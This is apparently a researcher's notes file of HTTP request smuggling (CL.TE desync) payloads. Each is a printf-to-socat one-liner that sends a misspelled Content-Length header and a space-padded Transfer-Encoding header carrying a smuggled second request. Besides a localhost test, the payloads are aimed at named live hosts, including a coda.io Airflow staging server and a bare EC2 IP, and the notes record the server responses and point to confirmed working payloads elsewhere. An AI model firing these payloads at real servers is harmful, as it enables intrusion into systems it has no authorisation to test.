# ALB CL.TE Payloads

## Payload 1 — Local localhost test

```bash
cat <(printf "POST /hello HTTP/1.1\r\nHost: localhost\r\nContent-Lenght: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: localhost") - | socat - TCP:localhost:80
```
> Note: when sending from another terminal, the connection wasn't initially working — it was actually configured with 2 workers (connection reuse needed).

---

## Payload 2 — Real server test (dev.easy.ac)

```bash
cat <(printf "POST / HTTP/1.1\r\nHost: dev.easy.ac\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n") - | socat - SSL:dev.easy.ac:443
```
Result: `400 Bad Request — Invalid HTTP header name: 'TRANSFER-ENCODING '`

dev.easy.ac runs Gunicorn 20+ (protected). Without space → 302 redirect to `/en/`.

---

## Payload 3 — Airflow staging (coda.io)

```bash
cat <(printf "HEAD /static/pin_32.png HTTP/1.1\r\nHost: airflow-staging.data.coda.io\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: airflow-staging.data.coda.io") - | socat - SSL:airflow-staging.data.coda.io:443
```
Result: `200 OK` with static file response. Request succeeded but no clear evidence of smuggled second request being processed (Connection: Close prevents reuse).

---

## Payload 4 — Direct EC2 test (Gunicorn 20.0.0)

```bash
cat <(printf "POST / HTTP/1.1\r\nHost: 16.170.215.216\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: 16.170.215.216") - | socat - TCP:16.170.215.216:80
```
Result: `400 Bad Request — Invalid HTTP header name: 'TRANSFER-ENCODING '`

This was the `real-ec2-docker` deployment running Gunicorn 20.0.0 — still rejects the space header.

---

## Successful Payload — ALB + Gunicorn 19.7.1

See `docs/alb-findings.md` for the confirmed working payloads against the ALB target.
